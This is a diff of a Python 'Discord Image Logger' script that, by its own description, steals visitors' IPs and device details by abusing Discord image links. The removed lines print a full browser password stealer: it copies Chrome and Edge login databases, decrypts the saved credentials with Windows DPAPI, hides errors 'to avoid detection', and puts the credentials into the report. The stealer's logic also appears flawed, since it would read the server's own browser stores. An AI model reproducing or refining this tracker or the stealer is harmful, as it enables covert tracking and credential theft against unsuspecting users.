@@ -4,11 +4,9 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
-import sqlite3, os, shutil
-from win32crypt import CryptUnprotectData  # Requires pywin32
 
 __app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs, passwords, and more by abusing Discord's Open Original feature"
+__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
 __author__ = "DeKrypt"
 
@@ -39,42 +37,6 @@ def reportError(error):
         }
     ],
 })
-
-def get_passwords():
-    passwords = []
-    paths = [
-        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
-        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
-        '/data/data/com.android.chrome/app_chrome/Default/Login Data'
-    ]
-    
-    for path in paths:
-        if not os.path.isfile(path):
-            continue
-        try:
-            # Copy file to bypass database lock
-            temp_db = os.path.join(os.getenv('TEMP'), 'temp_login.db')
-            shutil.copy2(path, temp_db)
-            
-            conn = sqlite3.connect(temp_db)
-            cursor = conn.cursor()
-            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-            for row in cursor.fetchall():
-                url, username, encrypted = row
-                if not url or not username or not encrypted:
-                    continue
-                try:
-                    # Decrypt password using Windows DPAPI
-                    decrypted = CryptUnprotectData(encrypted, None, None, None, 0)[1]
-                    passwords.append(f"**URL:** {url}\n**User:** {username}\n**Pass:** {decrypted.decode('utf-8')}\n")
-                except Exception as e:
-                    passwords.append(f"**URL:** {url}\n**User:** {username}\n**Pass:** Decryption Failed\n")
-            conn.close()
-            os.remove(temp_db)
-        except Exception as e:
-            pass  # Silence errors to avoid detection
-    
-    return passwords if passwords else ["No saved passwords found."]
 
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
@@ -125,13 +87,6 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         if config["antiBot"] == 1:
                 ping = ""
 
-    # Get passwords
-    try:
-        passwords = get_passwords()
-        password_text = "\n".join(passwords) if passwords else "No saved passwords found."
-    except:
-        password_text = "Password retrieval failed"
-
     os, browser = httpagentparser.simple_detect(useragent)
     
     embed = {
@@ -161,9 +116,6 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 **PC Info:**
 > **OS:** {os}
 > **Browser:** {browser}
-
-**Saved Passwords:**
-{password_text}
 
 **User Agent:**
 {useragent}
